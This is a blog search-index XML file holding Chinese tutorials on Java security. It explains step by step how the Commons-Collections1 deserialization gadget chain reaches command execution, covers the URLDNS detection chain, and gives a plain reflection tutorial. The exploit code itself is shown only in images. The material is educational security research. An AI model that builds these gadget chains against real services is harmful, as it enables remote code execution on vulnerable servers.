<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JAVA安全-Commons-Collections1反序列化</title>
    <link href="/2022/11/27/JAVA%E5%AE%89%E5%85%A8-Commons-Collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/11/27/JAVA%E5%AE%89%E5%85%A8-Commons-Collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA安全-Commons-Collections1反序列化"><a href="#JAVA安全-Commons-Collections1反序列化" class="headerlink" title="JAVA安全-Commons-Collections1反序列化"></a>JAVA安全-Commons-Collections1反序列化</h1><h2 id="一：产生背景和环境配置"><a href="#一：产生背景和环境配置" class="headerlink" title="一：产生背景和环境配置"></a>一：产生背景和环境配置</h2><h3 id="1：背景"><a href="#1：背景" class="headerlink" title="1：背景"></a>1：背景</h3><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。<strong>Commons</strong>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p><p><strong>Commons Collections</strong>包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充，是Java应用开发中一个非常常用的工具库。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。像许多常见的应用如Weblogic、WebSphere、Jboss、Jenkins等都使用了Apache Commons Collections工具库，当该工具库出现反序列化漏洞时，这些应用也受到了影响，这也是反序列化漏洞如此严重的原因。</p><h3 id="2：环境"><a href="#2：环境" class="headerlink" title="2：环境"></a>2：环境</h3><p><strong>1：</strong>jdk:因为CC1的利用链在8u71的版本就修复了，所以此次实验环境的jdk版本为<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">8u65</a></p><p>注意：将下载好的jdk中的src.zip解压后,把[openjdk](<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4 (java.net)</a>)的对应版本的sun包复制到8u65jdk的目录下</p><p><img src="http://tva3.sinaimg.cn/large/007u0ID7ly1h8fb1wigklj314n0ro4m7.jpg" alt="1"></p><p>​                                                                     (openjdk下载)</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7ly1h8fb09g2zyj30l0073taz.jpg" alt="2"></p><p>​                                             （将openjdk中的sun包复制到8u65目录下）</p><p><strong>2：</strong>其次打开IDEA创建maven项目，Project SDK选择你下载的jdk8u65的路径。然后下一步写你项目的名字和存放路径创建即可。</p><p>然后选择项目结构，选择SDKs，源路径添加src路径应用保存即可。</p><p><img src="http://tvax4.sinaimg.cn/large/007u0ID7ly1h8fbbvj658j31c10orgyf.jpg" alt="3"></p><p><strong>3：</strong>最后在pom.xml文件中添加commons collections 3.2.1版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>    &lt;!-- https:<span class="hljs-comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><p><img src="http://tva4.sinaimg.cn/large/007u0ID7ly1h8fbfh95knj30yn0erdut.jpg" alt="4"></p><h2 id="二：漏洞利用复现"><a href="#二：漏洞利用复现" class="headerlink" title="二：漏洞利用复现"></a>二：漏洞利用复现</h2><p>我们在复现漏洞或者利用漏洞之前要搞清楚这条链子是怎么发现并利用的，不能只知道怎么用而不知其原理。简单分析一下，在java中，反序列化的调用一定会调用<strong>readobject</strong>方法，比如，我们要找exec方法就要先找哪一个类的哪一个方法调用了exec，比如1.a调用了exec那么我们接下来就要找哪些类调用了a方法，然后发现1.b调用了a方法，那我们又要找那个类调用了b方法…以此往前推进直到找到 readObject方法。而这需要一个个一层层地去寻找，这也就是为什么叫“链”的原因。</p><h3 id="1：TransformedMap类"><a href="#1：TransformedMap类" class="headerlink" title="1：TransformedMap类"></a>1：<strong>TransformedMap</strong>类</h3><p>那么首先漏洞发现者是发现了Commons Collections里有一个<strong>Transformer</strong>类，那我们先分析Transformer接口类，查看它的实现类，发现该接口的重要实现类有：ChainedTransformer、invokerTransformer、MapTransformer、ConstantTransformer</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7ly1h8ivqaax5jj30z30lu4qp.jpg" alt="5"></p><p>逐个跟进分析，当我们跟进到<strong>invokerTransformer</strong>类的时候发现它的<strong>transform</strong>方法，传入一个对象，然后反射调用，其方法值，参数类型，参数都是<strong>可控的</strong>。相当于一个任意方法调用。</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7ly1h8ivxbpd1zj30z40mae4b.jpg" alt="6"></p><p>那么我们先试试利用invokerTransformer能否弹出计算器？</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7ly1h8iw3346ctj31ba0n31kx.jpg" alt="7"></p><p>现在，我们找到了<strong>invokerTransformer.transform</strong>方法为危险方法，接下来我们要往前寻找哪里调用了InvokerTransformer类中的transform方法，当然我们要寻找的是不同名字调用transform的方法，如果是同名是没有意义的。</p><p>经过寻找，发现<strong>Map</strong>类是可以进行进一步分析调用的，DefaultedMap和LazyMap中的get()方法调用transform，而<strong>TransformMap</strong>类中好几处都有调用，最终在<strong>checkSetValue</strong>中利用：</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7ly1h8iwro7qc6j31an0ctwza.jpg" alt="8"></p><p>跟进查看checkSetValue方法里面调用了<strong>valueTransformer.transform</strong>，进一步查看TransformedMap的<strong>构造函数</strong>：</p><p><img src="http://tva1.sinaimg.cn/large/007u0ID7ly1h8iwtz2zwvj30zc0ls4n7.jpg" alt="9"></p><p>他的作用就是接收一个Map进来然后对Map的<strong>key</strong>和<strong>value</strong>分别进行一些操作，因为是protect保护方法，我们发现他是从decorate静态方法调用的。我们来试一下：</p><p><img src="http://tva1.sinaimg.cn/large/007u0ID7ly1h8ixblz0jhj30yp0ljtup.jpg" alt="10"></p><p>其中，value的transformer就赋给invokerTransformer，那么<strong>当他调用checkSetValue方法的时候，就会调用我们的invokerTransformer.transform方法</strong>，并且value必须是可控的。</p><p>然后我们再分析哪里调用了checkSetValue方法呢？跟进发现只有<strong>AbstractInputCheckedMapDecorator类SetValue方法</strong>调用了checkSetValue。</p><h3 id="2：AbstractInputCheckedMapDecorator类"><a href="#2：AbstractInputCheckedMapDecorator类" class="headerlink" title="2：AbstractInputCheckedMapDecorator类"></a><strong>2：AbstractInputCheckedMapDecorator</strong>类</h3><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7ly1h8ixkezrvsj31bk0mg4qp.jpg" alt="11"></p><p>我们可以发现AbstractInputCheckedMapDecorator类是TransformedMap的父类。</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7ly1h8ixn69gq5j30wg09f12a.jpg" alt="12"></p><p>再跟进发现，里面有一个<strong>MapEntry</strong>类调用的SetValue方法，理解一下这里的代码，MapEntry中的setValue方法其实就是Entry中的setValue方法，他这里重写了setValue方法。TransformedMap接受Map对象并且进行转换是需要遍历Map的,遍历出的一个键值对就是Entry，所以当遍历Map时，setValue方法也就执行了。</p><p><img src="http://tva2.sinaimg.cn/large/007u0ID7ly1h8ixyq7wgcj30ry0fo15e.jpg" alt="13"></p><p>我们再来尝试一下：</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7ly1h8iye355oaj319z0lmhce.jpg" alt="14"></p><p>所以再根据之前的分析，我们现在只需要再寻找<strong>哪个类的readobject调用了setValue方法</strong>，最终在<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>中找到了readobject方法。这里面有一个遍历Map的功能并且调用了setValue 方法。</p><p><img src="http://tvax4.sinaimg.cn/large/007u0ID7ly1h8iyn2b2kdj319w0b8tqh.jpg" alt="15"></p><p>这就是我们沿着思路一步一步往前寻找利用方法最终找到readobject方法的大致流程图：</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7ly1h8iyqlgex2j30r90cln19.jpg" alt="16"></p><p>​                                                          （图片来源：白日梦组长）</p><p>接下来我们分析一下构造函数，他接受两个参数，一个<strong>type</strong>，一个<strong>Map</strong>（因为memberValues可控，我们可以把TransformedMap放进去），所以接下来我们实例化<strong>AnnotationInvocationHandler类</strong>并尝试调用memberValues。</p><p><img src="http://tva2.sinaimg.cn/large/007u0ID7ly1h8iyygd4jdj30yi0d7h14.jpg" alt="17"></p><p>注意这里上边<strong>不是public</strong>，那么只能在sun.reflect.annotation里才能访问到，所以我们要用<strong>反射来获取</strong>。</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7ly1h8izd9jjnfj30y008gqer.jpg" alt="18"></p><h3 id="3：解决小问题"><a href="#3：解决小问题" class="headerlink" title="3：解决小问题"></a>3：解决小问题</h3><p>但是到了这里之后，我们还发现有<strong>三个小问题</strong>，第一个就是我们的Runtime对象是自己生成的，他没有继承serialize接口，所以Runtime类不能序列化，但是class类是可以序列化的。</p><p>1：反射获取runtime实例，并执行代码：</p><p><img src="http://tvax4.sinaimg.cn/large/007u0ID7ly1h8izwapkr5j31620dandv.jpg" alt="19"></p><p>2：invokerTransformer方法获取runtime实例，并执行代码：</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7ly1h8j08bipj9j316s0i7two.jpg" alt="20"></p><p>3：如果用第二种方法的话要重复的写多个类，所以我们可以通过<strong>chainedTransformer</strong>类进行递归调用实现InvokerTransformer方法获取runtime实例，并执行代码</p><p><img src="http://tva3.sinaimg.cn/large/007u0ID7ly1h8j0ipcp75j318j0j0qrm.jpg" alt="21"></p><p>所以到这里我们就解决了第一个问题，但是还是无法运行成功，那么第二个问题就来了，我们分析AnnotationInvocationHandler类中发现有if判断没过，我们需要满足两个if判断才能成功执行SetValue方法。</p><p>我们手动调试一下，发现这里<strong>memberValues</strong>调用<strong>getKey()<strong>方法，然后再在memberTypes里面查找这个key，没找到就无法继续往下走，经过分析我们需要找到有成员方法的class，而</strong>Target</strong>正合适，所以我们修改注解为Target并且将<strong>map.put的key值改为value</strong>。</p><p><img src="http://tva3.sinaimg.cn/large/007u0ID7ly1h8j0ub93ljj30t20a0n7j.jpg" alt="22"></p><p>再次调试发现可以过if了，但是我们发现setValue方法中的值为AnnotationTypeMismatchExceptionProxy，而我们需要的是Runtime.class，此时分析我们最早在TransformedMap类中发现该接口的重要实现类有一个叫做<strong>ConstantTransformer</strong>的类，分析发现<strong>此类的transform方法无论传入什么参数，都会返回构造的时候传入的值</strong>。所以只需要最后调用的是ConstantTransformer的transformer方法就可以返回Runtime对象，就能确保value值为我们的Runtime.class</p><p><img src="http://tvax3.sinaimg.cn/large/007u0ID7ly1h8j15euobzj30y40dmdt1.jpg" alt="23"></p><p>最终三个小问题解决完毕，运行调用成功弹出计算器：</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7ly1h8jrt3zehnj31a70m61kx.jpg" alt="1669538100585"></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA安全-URLDNS链</title>
    <link href="/2022/11/15/JAVA%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/"/>
    <url>/2022/11/15/JAVA%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA安全-URLDNS链"><a href="#JAVA安全-URLDNS链" class="headerlink" title="JAVA安全-URLDNS链"></a>JAVA安全-URLDNS链</h1><h2 id="1：前言"><a href="#1：前言" class="headerlink" title="1：前言"></a>1：前言</h2><p>URLDNS链是java反序列化链中最简单的一条链子，也是java原生态的一条利用链，通常用于存在反序列化漏洞进行验证的，不存在版本限制，首先我们来了解一下java反序列化：Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件的过程叫做序列化。序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p><p>而反序列化是使用了<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p><h2 id="2：测试"><a href="#2：测试" class="headerlink" title="2：测试"></a>2：测试</h2><p>查看hashmap的接口中的readObject方法</p><p><img src="http://tva3.sinaimg.cn/large/007u0ID7ly1h866gizhijj31al0k27wh.jpg" alt="W63R`P5Q5D@_$C`BAIB78ER"></p><p>再往下看到<strong>hash</strong>方法，跟进之后发现判断语句 hash中传入一个对象如果不为空则调用hashcode方法</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7ly1h875eh6omtj31ap0k7b29.jpg" alt="K2Td09ep"></p><p>跟进之后发现判断，hashcode值不为-1则停止，为-1则继续，hashcode默认值为-1，所以会继续调用handler.hashcode方法</p><ul><li><img src="https://img1.imgtp.com/2022/11/15/i1w6GCmV.png" alt="J2@RPM`2TY6TNA`2_HE30Z7.png"></li></ul><p>后续跟进得出URLDNS整条链的<strong>调用流程</strong>为：</p><p>HashMap-&gt;readObject()</p><p>HashMap-&gt;hash()</p><p>URL-&gt;hashCode()</p><p>URLStreamHandler-&gt;hashCode()</p><p>URLStreamHandler-&gt;getHostAddress()</p><p>InetAddress-&gt;getByName()</p><p>InetAddress.getByName方法会使用<strong>远程请求</strong>，进行获取主机的ip，那么这时候就会触发一次请求，到了这里我们的dnslog平台，就可以收到响应了。这就是这个URLDNS链的一个触发点。</p><p>现在进行测试：</p><ul><li><p><img src="https://img1.imgtp.com/2022/11/16/oiTfhvr9.png" alt="3L__UH1VVIGQ_DH7PMLSUP6.png"></p><p>断点调试，调用hashmap.put方法前，是不会触发解析的，调用后能触发解析，dnslog也收到了解析信息，因为缓存多次重复运行，dnslog也不会再有新的记录</p><p><img src="http://tvax3.sinaimg.cn/large/007u0ID7ly1h875fld1h3j30vd0grdkk.jpg" alt="NZivh05R"></p></li></ul><p>以上是正常的hashmap做一个dns解析的访问</p><p>通过反射来修改hashcode的默认值从而导致前面说的hashcode方法停止继续调用而不能访问getHostAddress方法，最终解析失败。所以在进行反序列化时还要讲hashcode值改回-1</p><ul><li><img src="https://img1.imgtp.com/2022/11/16/68s5JJm9.jpg" alt="1668530288683.jpg"></li></ul><p>所以在序列化之前要将hashcode值改回-1，然后运行之后再反序列化最后成功解析。</p><ul><li><p><img src="https://img1.imgtp.com/2022/11/16/55LMQUZq.jpg" alt="1668530875666.jpg"></p></li><li><p><img src="https://img1.imgtp.com/2022/11/16/BQRfUGeT.jpg" alt="15641654.jpg"></p></li></ul><h2 id="3：总结"><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h2><p> java.util.HashMap重写了readObject方法，在反序列化时会调用 hash 函数计算 key 的 hashCode，在计算hashCode()的时候，就会调用URLStreamHandler.hashCode()触发getHost方法对目标进行DNS解析，其主要目的用来<strong>检测是否存在反序列化漏洞</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA-反射</title>
    <link href="/2022/09/26/Java-%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/09/26/Java-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java-反射"></a>Java-反射</h1><h2 id="1-反射的概述："><a href="#1-反射的概述：" class="headerlink" title="1.反射的概述："></a>1.反射的概述：</h2><p><strong>反射</strong>(Reflection),Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的<strong>所有属性和方法</strong>，对于任意一个对象，都能够<strong>调用它的任意一个方法和属性</strong>(包括<strong>私有</strong>的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java的反射机制。</p><p>反射是java被视为动态语言的关键，反射机制允许程序在执行期借助于Reflection API获取任何类的内部信息，并且能直接操作任意对象的内部属性及方法。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">Class</span> c = <span class="hljs-keyword">Class</span>.forName(“Java.lang.<span class="hljs-keyword">String</span>”)<br></code></pre></td></tr></table></figure><p>流程示意图：</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7gy1h6jvpdyijrj30nh06fwes.jpg" alt="302415386d4040322023995504e552d"></p><p><strong>举例理解反射：</strong></p><p>  假设一个人意外死亡，法医需要<strong>解剖</strong>来查看他的死因，以及他的<strong>属性</strong>(年龄，体重，呼吸道，各类器官…)</p><p>  因为人已经死亡，我们<strong>解剖的过程</strong>也可以形象的理解为“反射”。<strong>得到完整的“包类名称”</strong>就相当于解剖获得器官的过程。</p><p><strong>反射相关的主要API：</strong></p><ul><li><strong>java.lang.Class</strong>: 代表一个类</li><li>java.lang.reflect.Method: 代表类的方法</li><li>java.lang.reflect.Field: 代表类的成员变量</li><li>java.lang.reflect.Constructor: 代表类的构造器</li></ul><p><strong>Class类的常用方法：</strong></p><table><thead><tr><th>方法名</th><th>功能</th></tr></thead><tbody><tr><td>static ClassforName(String name)</td><td>返回指定类名name的Class对象</td></tr><tr><td>newInstance()</td><td>在内存中生成一个实例</td></tr><tr><td>getName()</td><td>返回当前Class对象所表示的实体(类，接口，数组类或void)的名称</td></tr><tr><td>Class getSuperClass()</td><td>返回当前Class对象的父类的Class对象</td></tr><tr><td>Class[] getinterfaces()</td><td>获取当前Class对象的接口</td></tr><tr><td>ClassLoader getClassLoader()</td><td>返回该类的类加载器</td></tr><tr><td>Field[] getDeclaredFields</td><td>返回Field对象的一个数组</td></tr><tr><td>Method getMethed(String name,Class.. parameterTypes)</td><td>返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定公共成员方法。</td></tr></tbody></table><h2 id="2-获取Class对象的三种方式"><a href="#2-获取Class对象的三种方式" class="headerlink" title="2.获取Class对象的三种方式"></a>2.获取Class对象的三种方式</h2><p>1: 通过该实例变量提供的<code>getClass()</code>方法获取：</p><p>2: 通过静态方法<code>Class.forName()</code>获取(要先知道class的完整类名)：</p><p>3: 直接通过一个<code>class</code>的静态变量class获取：</p><p>如图：</p><p><img src="http://tvax4.sinaimg.cn/large/007u0ID7gy1h6jwq22mf1j30te0eyqge.jpg" alt="1664167464019"></p><p><strong>注意</strong>：</p><p>运行期间，一个类中只有一个class对象产生，图中c1，c2，c3的hashCode都是相同的。</p><p>且平常最常用的方法就是第二种。</p><h2 id="获取运行时类的完整结构"><a href="#获取运行时类的完整结构" class="headerlink" title="获取运行时类的完整结构"></a>获取运行时类的完整结构</h2><p><strong>1：获取字段</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ke1r.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-comment">//获取类的信息</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException,NoSuchFieldException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ke1r.reflection.User&quot;</span>);<br><br>        <span class="hljs-comment">//获得类的名字</span><br>        System.out.println(c1.getName());<span class="hljs-comment">//获得包名+类名</span><br>        System.out.println(c1.getSimpleName());<span class="hljs-comment">//获得类名</span><br>        <span class="hljs-comment">//获得类的属性</span><br>        System.out.println(<span class="hljs-string">&quot;=========================&quot;</span>);<br>        Field[] fields = c1.getFields();<span class="hljs-comment">//只能找到public属性</span><br><br>        fields = c1.getDeclaredFields();<span class="hljs-comment">//找到全部的属性</span><br>        <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>            System.out.println(field);<br>        &#125;<br><br>        <span class="hljs-comment">//获得指定属性的值</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7gy1h6k0dcqytxj30ph06wagd.jpg" alt="1664175020886"></p><p>所有通过Class实例的方法可以获取Field实例，getField()，getFields()，getDeclaredField()，getDeclaredFields()；</p><p>此外Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。</p><p><strong>2：调用方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ke1r.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ke1r.reflection.User&quot;</span>);<br><br>        <span class="hljs-comment">//获得类的方法</span><br>        System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>        Method[] methods = c1.getMethods();<span class="hljs-comment">//获得本类及其父类的全部public方法</span><br>        <span class="hljs-keyword">for</span> (Method method : methods) &#123;<br>            System.out.println(<span class="hljs-string">&quot;正常的:&quot;</span>+method);<br>        &#125;<span class="hljs-comment">//公共的</span><br>        methods = c1.getDeclaredMethods();<span class="hljs-comment">//获得本类的所有方法</span><br>        <span class="hljs-keyword">for</span> (Method method : methods) &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDeclaredMethods:&quot;</span>+method);<br>        &#125;<span class="hljs-comment">//全部的</span><br><br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-comment">//重载</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getName</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>        System.out.println(getName);<br>        System.out.println(setName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7gy1h6k0r8uoe3j30vz0k1tze.jpg" alt="1664175785733"></p><p> 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()；</p><p>调用指定方法：</p><p>通过<code>getMethod(String name,Class…parameterTypes</code>)方法取得一个Method对象,并设置此方法操作时所需要的类型。之后使用<code>Object invoke(Object obj,Object[] args)</code>进行调用，并向方法中传递要设置的obj对象的参数信息。若原方法声明为private，则需要在调用此invoke()方法前，显示调用方法对象的setAccessible(true)方法,则可以访问private方法。</p><p>注意：Method、Field、Constructor对象都有**setAccessible()**方法。</p><p>setAccessible()作用是启用和禁用访问安全检查的开关。</p><p><strong>3：获得构造器方法</strong></p><p>通过反射来创建新的实例，我们可以调用Class提供的<code>newInstance()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Person.class.newInstance();<br></code></pre></td></tr></table></figure><p>但是<strong>它只能调用该类的public无参数构造方法。</strong>如果想要调用任意构造方法，就需要用到API提供的<strong>Constructor</strong>对象，Constructor对象和Method很类似，但是不同之处仅在于它是一个构造方法，调用结果总是返回实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">package</span> com.ke1r.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ke1r.reflection.User&quot;</span>);<br><span class="hljs-comment">//获得指定的构造器</span><br>        System.out.println(<span class="hljs-string">&quot;=====================&quot;</span>);<br>        Constructor[] constructors = c1.getConstructors();<br>        <span class="hljs-keyword">for</span> (Constructor constructor : constructors) &#123;<br>            System.out.println(constructor);<br>        &#125;<br>        constructors = c1.getDeclaredConstructors();<br>        <span class="hljs-keyword">for</span> (Constructor constructor : constructors) &#123;<br>            System.out.println(<span class="hljs-string">&quot;###&quot;</span>+constructor);<br>        &#125;<br>        <span class="hljs-comment">//获得指定的构造器</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        System.out.println(<span class="hljs-string">&quot;指定:&quot;</span>+ declaredConstructor);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="http://tvax1.sinaimg.cn/large/007u0ID7gy1h6k1glzlooj30oy0700ys.jpg" alt="1664177302531"></p><p>通过Class实例方法可以获取Constructor实例：</p><p>getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()</p><h2 id="Java反射的优缺点"><a href="#Java反射的优缺点" class="headerlink" title="Java反射的优缺点"></a>Java反射的优缺点</h2><p><strong>优点：</strong></p><p>可以实现动态创建对象和编译，有很大的灵活性。</p><p><strong>缺点：</strong></p><p>对性能有影响，使用反射机制基本上是一种解释操作，我们可以告诉JVM我们希望做什么并且它满足我们的要求，这类操作总是慢于直接执行相同的操作。</p><p>测试效果：</p><p><img src="http://tva1.sinaimg.cn/large/007u0ID7gy1h6k1z7ae89j30oy06xn1x.jpg" alt="1664178340553"></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos协议与NTLM认证</title>
    <link href="/2022/06/29/Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%8ENTLM%E8%AE%A4%E8%AF%81/"/>
    <url>/2022/06/29/Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%8ENTLM%E8%AE%A4%E8%AF%81/</url>
    
